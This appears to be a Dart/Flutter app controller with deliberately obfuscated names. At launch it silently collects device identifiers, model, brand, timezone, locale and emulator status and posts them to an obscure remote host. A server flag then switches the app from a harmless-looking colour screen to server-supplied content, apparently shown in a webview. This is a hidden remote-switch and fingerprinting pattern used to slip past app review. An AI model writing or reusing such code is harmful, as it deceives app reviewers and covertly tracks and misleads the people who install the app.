import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkOper() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/check");
  }
}

class PageLogic extends GetxController {


  var fpiuocjk = RxBool(false);
  var ojfvamcy = RxBool(true);
  var ikjruz = RxString("");
  var jeremy = RxBool(false);
  var daugherty = RxBool(true);
  final cvhrsm = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkOper();
    super.onInit();
    gnvsb();
  }


  Future<void> gnvsb() async {

    jeremy.value = true;
    daugherty.value = true;
    ojfvamcy.value = false;

    cvhrsm.post("https://up.ppoitusb.xyz/kjmbeazpyudtfgcxhriwlovsnq",data: await sjvmnzxfib()).then((value) {
      var mhvqo = value.data["mhvqo"] as String;
      var pfcijbt = value.data["pfcijbt"] as bool;
      if (pfcijbt) {
        ikjruz.value = mhvqo;
        billie();
      } else {
        lesch();
      }
    }).catchError((e) {
      ojfvamcy.value = true;
      daugherty.value = true;
      jeremy.value = false;
    });
  }

  Future<Map<String, dynamic>> sjvmnzxfib() async {
    final DeviceInfoPlugin rexu = DeviceInfoPlugin();
    PackageInfo wprzf_eycnw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xmtfjd = Platform.localeName;
    var cvod_UfteYV = currentTimeZone;

    var cvod_ir = wprzf_eycnw.packageName;
    var cvod_cqQvz = wprzf_eycnw.version;
    var cvod_cTz = wprzf_eycnw.buildNumber;

    var cvod_ECSZvK = wprzf_eycnw.appName;
    var cvod_EIB = "";
    var cvod_isoNQHIW  = "";
    var cvod_ADeZW = "";
    var javierChristiansen = "";
    var rosaliaStark = "";
    var mollyRussel = "";
    var caylaKerluke = "";
    var myrnaProhaska = "";
    var mckaylaProhaska = "";
    var fridaGlover = "";
    var jammieHand = "";


    var cvod_Mhp = "";
    var cvod_uJicHQ = false;

    if (GetPlatform.isAndroid) {
      cvod_Mhp = "android";
      var uidhxyt = await rexu.androidInfo;

      cvod_ADeZW = uidhxyt.brand;

      cvod_EIB  = uidhxyt.model;
      cvod_isoNQHIW = uidhxyt.id;

      cvod_uJicHQ = uidhxyt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      cvod_Mhp = "ios";
      var zlrjgbtu = await rexu.iosInfo;
      cvod_ADeZW = zlrjgbtu.name;
      cvod_EIB = zlrjgbtu.model;

      cvod_isoNQHIW = zlrjgbtu.identifierForVendor ?? "";
      cvod_uJicHQ  = zlrjgbtu.isPhysicalDevice;
    }
    var res = {
      "cvod_ECSZvK": cvod_ECSZvK,
      "javierChristiansen" : javierChristiansen,
      "cvod_cTz": cvod_cTz,
      "cvod_cqQvz": cvod_cqQvz,
      "cvod_EIB": cvod_EIB,
      "cvod_UfteYV": cvod_UfteYV,
      "mckaylaProhaska" : mckaylaProhaska,
      "cvod_ADeZW": cvod_ADeZW,
      "xmtfjd": xmtfjd,
      "cvod_Mhp": cvod_Mhp,
      "cvod_uJicHQ": cvod_uJicHQ,
      "rosaliaStark" : rosaliaStark,
      "mollyRussel" : mollyRussel,
      "caylaKerluke" : caylaKerluke,
      "myrnaProhaska" : myrnaProhaska,
      "cvod_isoNQHIW": cvod_isoNQHIW,
      "cvod_ir": cvod_ir,
      "fridaGlover" : fridaGlover,
      "jammieHand" : jammieHand,

    };
    return res;
  }

  Future<void> lesch() async {
    Get.offAllNamed("/color_tab");
  }

  Future<void> billie() async {
    Get.offAllNamed("/color_input");
  }

}
